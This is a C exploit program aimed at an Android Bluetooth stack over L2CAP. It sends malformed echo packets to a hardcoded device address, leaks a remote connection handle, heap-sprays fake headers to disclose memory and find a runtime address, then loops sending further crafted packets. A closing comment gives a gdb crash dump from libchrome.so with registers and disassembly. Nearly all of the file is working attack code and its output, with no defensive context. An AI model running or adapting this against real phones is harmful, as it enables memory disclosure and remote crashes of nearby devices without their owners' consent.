#include <sys/time.h>
#include <sys/types.h>
#include <sys/select.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

#define ECHO_REQUEST 0x08
#define ECHO_RESPONSE 0x09

#define HANDLE_MASK 0x0FFF
#define START_PACKET_BOUNDARY 2
#define CONTINUATION_PACKET_BOUNDARY 1

#define l2_hci_packet_header_len 13
#define MSG_HC_TO_STACK_HCI_ACL 0x1100
int maxfd = 2;

int wsocket(int __domain, int __type, int __protocol)
{
    int fd = socket(__domain, __type, __protocol);
    if (maxfd < fd)
    {
        maxfd = fd;
    }
    return fd;
}

typedef struct fakedata
{
    uint16_t fake_handle;
    uint16_t fake_len_acl;
    uint16_t fake_len_l2cap;
    uint16_t fake_cid;
    //acl_hdr
    uint8_t fake_command;
    uint8_t fake_ident;
    uint16_t fake_len_data;
} __attribute__((packed)) fakedata;

typedef struct l2_hci_packet
{
    unsigned char pk;
    uint16_t handle;
    uint16_t len_acl;
    // hci_hdr
    uint16_t len_l2cap;
    uint16_t cid;
    //acl_hdr
    uint8_t command;
    uint8_t ident;
    uint16_t len_data;
    //l2cap_hdr
    uint8_t data[];
} __attribute__((packed)) l2_hci_packet;

typedef struct l2_command_packet
{
    uint8_t command;
    uint8_t ident;
    uint16_t len;
    uint8_t data[];
} __attribute__((packed)) l2_command_packet;

l2_hci_packet *create_l2_echo_hci(uint16_t handle, uint8_t ident, int datalen, int continuation_flags, int lenadjust)
{
    l2_hci_packet *packet = calloc(1, lenadjust + datalen + l2_hci_packet_header_len);
    if (!packet)
    {
        exit(0);
        return NULL;
    }
    packet->pk = 2;
    packet->handle = (handle & HANDLE_MASK) | (continuation_flags << 12);
    packet->len_acl = datalen + 8;
    //hci
    packet->len_l2cap = datalen + 4 + lenadjust;
    packet->cid = htobs(0x0001);
    //acl
    packet->command = ECHO_REQUEST;
    packet->ident = ident;
    packet->len_data = datalen + lenadjust;
    //l2cap
    return packet;
}

void packet_free(l2_hci_packet *packet)
{
    packet = ((long)packet) & (~0xf);
    free(packet);
}

l2_command_packet *recv_l2_echo_select(int sock, int ident)
{
    struct timeval timeout = {1, 0};
    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    if (select(maxfd + 1, &fds, NULL, NULL, &timeout))
    {

        char buf[0x1000] = {};
        int n = read(sock, buf, 0x1000);
        if (n < 0)
        {
            return NULL;
        }
        l2_command_packet *packet = calloc(1, n);
        if (!packet)
        {
            return NULL;
        }
        memcpy(packet, buf, n);
        printf("recv a l2_packet command is %d length is %d \n", packet->command, packet->len);

        if (packet->command != ECHO_RESPONSE)
        {
            puts("echo resp");
            return NULL;
        }
        puts("is a l2cap echo resp");
        printf("            ");
        for (size_t i = 0; i < packet->len; i++)
        {
            printf("%02x ", packet->data[i]);
            if ((i % 0x10) == (0xf - 4))
            {
                puts("");
            }
        }
        puts("");

        return packet;
    }
    return NULL;
}

l2_command_packet *recv_l2_echo(int sock, int ident)
{
    char buf[0x1000] = {};
    int n = read(sock, buf, 0x1000);
    if (n < 0)
    {
        return NULL;
    }
    l2_command_packet *packet = calloc(1, n);
    if (!packet)
    {
        return NULL;
    }
    memcpy(packet, buf, n);
    printf("recv a l2_packet command is %d length is %d \n", packet->command, packet->len);

    if (packet->command != ECHO_RESPONSE)
    {
        puts("echo resp");
        return NULL;
    }
    puts("is a l2cap echo resp");
    printf("            ");
    for (size_t i = 0; i < packet->len; i++)
    {
        printf("%02x ", packet->data[i]);
        if ((i % 0x10) == (0xf - 4))
        {
            puts("");
        }
    }
    puts("");

    return packet;
}

int send_l2_echo(l2_hci_packet *packet, int sock, int length)
{
    struct iovec iv;
    iv.iov_base = packet;
    iv.iov_len = length;
    if (writev(sock, &iv, 1) < 0)
    {
        puts("write error");
        exit(-1);
        return -1;
    }
    return 0;
}

int main(int argc, char **argv)
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    char mac_addr[] = "9c:2e:a1:53:bf:16";
    int hci_device_id = hci_get_route(NULL);
    int hci_socket = hci_open_dev(hci_device_id);
    int opt = 1;
    char *runtime_ptr = NULL;
    // char filter[] = "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00";
    //setsockopt(hci_socket, SOL_HCI, HCI_DATA_DIR, &opt, sizeof(opt));
    //setsockopt(hci_socket, SOL_HCI, HCI_FILTER, filter, sizeof(filter));
    struct sockaddr_hci addr = {};
    addr.hci_family = AF_BLUETOOTH;
    addr.hci_dev = 0; // hci0
    printf("get hci socket %d\n", hci_socket);

    int l2_sock = wsocket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
    if (bind(l2_sock, &addr, sizeof(addr)) < 0)
    {
        puts("bind error2");
        exit(0);
    }
    struct sockaddr_l2 daddr;
    daddr.l2_family = AF_BLUETOOTH;
    str2ba(mac_addr, &daddr.l2_bdaddr);
    if (connect(l2_sock, (struct sockaddr *)&daddr, sizeof(daddr)) < 0)
    {
        puts("connect error");
        exit(0);
    }
    //getchar();
    struct l2cap_conninfo l2_conninfo;
    socklen_t l2_conninfolen = sizeof(l2_conninfo);
    getsockopt(l2_sock, SOL_L2CAP, L2CAP_CONNINFO, &l2_conninfo, &l2_conninfolen);
    printf("get handle %d\n", l2_conninfo.hci_handle);
    int handle = l2_conninfo.hci_handle;
    //leak remote handle   data len > 0x40 to avoid change xx_hdr
    l2_hci_packet *packet = create_l2_echo_hci(handle, 0xaa, 0x50, 2, 2);
    memset(packet->data, 0x1, packet->len_data);
    send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
    packet_free(packet);

    packet = create_l2_echo_hci(handle, 0xab, 0x50, 1, 0);
    memset(packet->data, 0x1, packet->len_data);
    send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
    packet_free(packet);

    l2_command_packet *l2packet = recv_l2_echo(l2_sock, 0xaa);
    while (!l2packet)
    {
        l2packet = recv_l2_echo(l2_sock, 0xaa);
    }

    uint16_t remotehandle = (*((uint16_t *)(&l2packet->data[l2packet->len - 6]))) & 0xfff;
    printf("remote handle %d\n", remotehandle);

    fakedata fake = {};
    {
        fake.fake_cid = 0x1;
        fake.fake_command = ECHO_REQUEST;
        fake.fake_handle = remotehandle;
        fake.fake_ident = 0x66;
        fake.fake_len_acl = 0x280;
        fake.fake_len_l2cap = fake.fake_len_acl - 4;
        fake.fake_len_data = fake.fake_len_l2cap - 4;
    }
    int sprayn = 4;
    int ok = 0;
    int i = 0;
    // heap spary  https://www.anquanke.com/post/id/85982  size is same
    while (!ok)
    {
        printf("overflow %d\n", i);
        i++;
        for (size_t j = 0; j < sprayn; j++)
        {
            packet = create_l2_echo_hci(handle, 0x67 + i * sprayn + j, 0x20 + 0x2 + 6 + 2 + 8 + 4+0x50, 2, 0);
            memset(packet->data, 'a', 6+0x50);
            memcpy(packet->data +  6+0x50, &fake, sizeof(fake));
            memset(packet->data +  6+0x50 + sizeof(fake), 0xff, packet->len_data - 6 - sizeof(fake));
            send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
            packet_free(packet);

            l2packet = recv_l2_echo(l2_sock, 0x67 + i * sprayn);
            while (!l2packet)
            {
                l2packet = recv_l2_echo(l2_sock, 0x67 + i * sprayn);
            }
        }

        printf("heap spray\n");
        packet = create_l2_echo_hci(handle, 0x67 + sprayn + i * sprayn, 0x20 + 0x2 + 6 + 2 + 8 + 4, 2, 2);
        memset(packet->data, 0x1, packet->len_data);
        send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
        packet_free(packet);

        packet = create_l2_echo_hci(handle, 0x67 + sprayn + i * sprayn + 1, 0x20 + 0x2 + 6 + 2 + 8 + 4+0x50, 1, 0);
        memset(packet->data, 0x2, packet->len_data);
        send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
        packet_free(packet);

        l2packet = recv_l2_echo_select(l2_sock, 0x66);
        int times = 2;
        while (!l2packet)
        {
            printf("try %d\n", times);
            times++;
            if (times > 3)
            {
                break;
            }
            l2packet = recv_l2_echo_select(l2_sock, 0x66);
        }

        if (l2packet && l2packet->len > 0x100)
        {
            char succ = 0;
            printf("leak success, checking\n");
            unsigned long *ptr = (unsigned long *)&l2packet->data[0x24];
            for (size_t i = 0; i < (fake.fake_len_data - 0x24) / 8; i++)
            {
                printf("%016lx ", ptr[i]);
                if (i % 4 == 3)
                {
                    puts("");
                }
                if (!succ && ((ptr[i] & 0xfff) == 0x898))
                {
                    runtime_ptr = ptr[i];
                    succ = 1;
                }
            }
            puts("");
            if (succ)
            {
                break;
            }
            // ok = 1;
        }
        // l2packet  = recv_l2_echo(l2_sock,0xaa);
        // while(!l2packet){
        //     l2packet = recv_l2_echo(l2_sock,0xaa);
        // }
    }
    packet_free(l2packet);
    printf("leak address success\n");
    printf("address = %p\n", runtime_ptr);
    // crash it

    // leak more data
    // bt_hdr 8 event len offset layer
    // hci_hdr 4 handle len
    // acl_hdr 4 len cid
    // l2cap hdr  command ident len
    // data    8+4+4

    // for (size_t i = 0; i < 0x50; i++)
    // {
    //     packet->ident = 0x8e + i;
    //     for (size_t j = 0; j < packet->len_data; j++)
    //     {
    //         packet->data[j] = i;
    //     }
    //     send_l2_echo(packet,hci_socket,packet->len_data+l2_hci_packet_header_len);
    //     l2packet  = recv_l2_echo(l2_sock,packet->ident);
    //     while(!l2packet){
    //         l2packet = recv_l2_echo(l2_sock,packet->ident);
    //     }
    //     //sleep(1);
    // }
    //prepare payload len
    int payloadlen = 630;
    int o = 0;
    while (1)
    {
        packet = create_l2_echo_hci(handle, (0x36 + o * 3) % 0xf0, payloadlen, 2, 2);
        memset(packet->data, 0x1, packet->len_data);
        send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
        packet_free(packet);

        packet = create_l2_echo_hci(handle, (0x37 + o * 3) % 0xf0, payloadlen, 1, 0);
        memset(packet->data, 0x2, packet->len_data);
        send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
        packet_free(packet);

        l2packet = recv_l2_echo_select(l2_sock, (0x36 + o * 3) % 0xf0);
        int times = 2;
        while (!l2packet)
        {
            printf("try %d\n", times);
            times++;
            if (times > 3)
            {
                break;
            }
            l2packet = recv_l2_echo_select(l2_sock, (0x36 + o * 3) % 0xf0);
        }
        packet = create_l2_echo_hci(handle, (0x38 + o * 3) % 0xf0, payloadlen, 2, 0);
        memset(packet->data, 0x1, packet->len_data);
        send_l2_echo(packet, hci_socket, packet->len_data + l2_hci_packet_header_len);
        packet_free(packet);
        l2packet = recv_l2_echo_select(l2_sock, (0x38 + o * 3) % 0xf0);
    }

    getchar();

    close(l2_sock);
    close(hci_socket);
}

/*
crashed in /system/lib64/libchrome.so
leak address is android_runtime

Thread 34 "HwBinder:30548_" received signal SIGSEGV, Segmentation fault.
0x000000710a1253cc in base::TaskRunner::PostTask(tracked_objects::Location const&, base::Callback<void (), (base::internal::CopyMode)0, (base::internal::RepeatMode)0>) () from ./system/lib64/libchrome.so
(gdb) info registers
x0             0x7107dd2a70	485463239280
x1             0x7107dd2ab8	485463239352
x2             0x7107dd2ab8	485463239352
x3             0x71091ac57c	485484053884
x4             0x71092b1af4	485485124340
x5             0x711cc23088	485813792904
x6             0xffffffffffffffff	-1
x7             0xffffffffffffffff	-1
x8             0x202020202020086	144680345676152966
x9             0x710a0c7a58	485499894360
x10            0x99	153
x11            0xffffffff	4294967295
x12            0x1	1
x13            0x0	0
x14            0x0	0
x15            0x0	0
x16            0x710952a4f8	485487715576
x17            0x710a125398	485500277656
x18            0x10	16
x19            0x711cc23090	485813792912
x20            0x7107dd2b30	485463239472
x21            0x7107dd3588	485463242120
x22            0x711ccffb90	485814696848
x23            0x7107dd3588	485463242120
x24            0x7107dd3588	485463242120
x25            0x8a	138
x26            0x8e	142
x27            0x3ea00007754	4303557261140
x28            0x1	1
x29            0x7107dd2aa0	485463239328
x30            0x71091ac60c	485484054028
sp             0x7107dd2a70	0x7107dd2a70
pc             0x710a1253cc	0x710a1253cc <base::TaskRunner::PostTask(tracked_objects::Location const&, base::Callback<void (), (base::internal::CopyMode)0, (base::internal::RepeatMode)0>)+52>
cpsr           0x60000000	[ EL=0 C Z ]
fpsr           0x13	19
fpcr           0x0	0
(gdb) x/40i $pc
=> 0x710a1253cc <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+52>:	ldr	x22, [x8]
   0x710a1253d0 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+56>:	bl	0x710a0bea20 <_ZN4base8internal12CallbackBaseILNS0_8CopyModeE0EEC2EOS3_@plt>
   0x710a1253d4 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+60>:	mov	x2, sp
   0x710a1253d8 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+64>:	mov	x0, x19
   0x710a1253dc <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+68>:	mov	x1, x20
   0x710a1253e0 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+72>:	mov	x3, xzr
   0x710a1253e4 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+76>:	blr	x22
   0x710a1253e8 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+80>:	mov	w19, w0
   0x710a1253ec <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+84>:	mov	x0, sp
   0x710a1253f0 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+88>:	bl	0x710a0bdb80 <_ZN4base8internal12CallbackBaseILNS0_8CopyModeE0EED2Ev@plt>
   0x710a1253f4 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+92>:	ldr	x8, [x21, #40]
   0x710a1253f8 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+96>:	ldr	x9, [sp, #8]
   0x710a1253fc <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+100>:	cmp	x8, x9
   0x710a125400 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+104>:	b.ne	0x710a12541c <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+132>  // b.any
   0x710a125404 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+108>:	and	w0, w19, #0x1
   0x710a125408 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+112>:	ldp	x29, x30, [sp, #48]
   0x710a12540c <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+116>:	ldp	x20, x19, [sp, #32]
   0x710a125410 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+120>:	ldp	x22, x21, [sp, #16]
   0x710a125414 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+124>:	add	sp, sp, #0x40
   0x710a125418 <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+128>:	ret
   0x710a12541c <_ZN4base10TaskRunner8PostTaskERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEE+132>:	bl	0x710a0bdb90 <__stack_chk_fail@plt>
   0x710a125420 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_>:	sub	sp, sp, #0x60
   0x710a125424 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+4>:	str	x21, [sp, #48]
   0x710a125428 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+8>:	stp	x20, x19, [sp, #64]
   0x710a12542c <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+12>:	stp	x29, x30, [sp, #80]
   0x710a125430 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+16>:	add	x29, sp, #0x50
   0x710a125434 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+20>:	mrs	x21, tpidr_el0
   0x710a125438 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+24>:	ldr	x8, [x21, #40]
   0x710a12543c <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+28>:	adrp	x9, 0x710a1b6000
   0x710a125440 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+32>:	add	x9, x9, #0x390
   0x710a125444 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+36>:	add	x9, x9, #0x10
   0x710a125448 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+40>:	mov	x20, x1
   0x710a12544c <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+44>:	str	x8, [sp, #40]
   0x710a125450 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+48>:	stp	x9, x0, [sp, #24]
   0x710a125454 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+52>:	add	x0, sp, #0x10
   0x710a125458 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+56>:	mov	x1, x2
   0x710a12545c <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+60>:	mov	x19, x3
   0x710a125460 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+64>:	bl	0x710a0bea20 <_ZN4base8internal12CallbackBaseILNS0_8CopyModeE0EEC2EOS3_@plt>
   0x710a125464 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+68>:	add	x0, sp, #0x8
   0x710a125468 <_ZN4base10TaskRunner16PostTaskAndReplyERKN15tracked_objects8LocationENS_8CallbackIFvvELNS_8internal8CopyModeE0ELNS7_10RepeatModeE0EEESA_+72>:	mov	x1, x19
(gdb)
*/